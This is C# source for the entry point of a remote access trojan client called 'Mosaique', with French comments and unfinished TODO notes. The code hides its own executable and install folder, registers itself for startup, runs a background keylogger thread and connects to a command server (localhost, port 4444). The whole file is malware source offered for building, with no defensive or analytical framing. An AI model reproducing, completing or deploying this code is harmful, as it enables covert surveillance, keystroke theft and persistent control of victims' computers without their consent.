using Client.Controllers;
using Client.Controllers.Tools;
using Client.Models;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Client
{
    static class Program
    {
        public static ClientMosaique client;
        private static ApplicationContext _msgLoop; // KEYLOGGER
        private static bool _result;

        /// <summary>
        /// Point d'entrée principal de l'application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Boot.Initialization();

            //public static string getMutexKey()
            //{
            //StreamReader readerMutex = new StreamReader(System.Reflection.Assembly.GetExecutingAssembly().Location);// TODO virer
            //    string mutex = readerMutex.ReadToEnd();
            //    mutex = mutex.Substring(mutex.IndexOf("-STARTmutex-"), mutex.IndexOf("-ENDmutex-") - mutex.IndexOf("-STARTmutex-"));
            //    string mutexKey = mutex.Replace("-STARTmutex-", "");
            //    return mutexKey;
            //}
            //MutexController.mutexKey = Boot.getMutexKey(readerMutex);// TODO virer

            MutexController.mutexKey = "sdfmlksdmflksdfmlkQQSDQSd5454654EZEZEZZE";// TODO virer    

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            if (MosaiqueLauncher())
            {
                client = new ClientMosaique("127.0.0.1", 4444);
                //client = new ClientMosaic(bootController.host, bootController.port);
                client.connect();
            }
        }

        private static bool MosaiqueLauncher()
        {
            _result = MutexController.createMutex();// TODO virer

            if (!_result) // TODO virer
            {
                MessageBox.Show("Another instance of application is already running !");
                return false;
            }

            ClientData.installPath = Path.Combine(Boot.DIRECTORY, ((!string.IsNullOrEmpty(Boot.installSubDirectory)) ? Boot.installSubDirectory + @"\" : "") + Boot.installFileName); // 

            // If install == false OR already installed
            if(!Boot.installStub || ClientData.currentPath == ClientData.installPath) 
            {
                if(Boot.installStub && Boot.hideFile) // INSTALL
                {
                    try
                    {
                        File.SetAttributes(ClientData.currentPath, FileAttributes.Hidden);
                    }
                    catch
                    {
                    }
                }
                if(Boot.installStub && Boot.hideSubDirectory && !string.IsNullOrEmpty(Boot.installSubDirectory)) // INSTALL
                {
                    try
                    {
                        DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(ClientData.installPath));
                        di.Attributes |= FileAttributes.Hidden;
                    }
                    catch
                    {

                    }
                }

                if (Boot.autoStartEnabled) // STARTUP
                {
                    if (!ClientInstallerController.AddToStartup())
                        ClientData.AddToStartupFailed = true;
                }
                if (Boot.keyloggerEnabled) // KEYLOGGER
                {
                    new Thread(() =>
                    {
                        _msgLoop = new ApplicationContext();
                        Keylogger logger = new Keylogger(15000);
                        Application.Run(_msgLoop);
                    })
                    { IsBackground = true }.Start();
                }

                return true;
            }
            else
            {
                MutexController.closeMutex();
                ClientInstallerController.install();
                return false;
            }
        }
    }
}
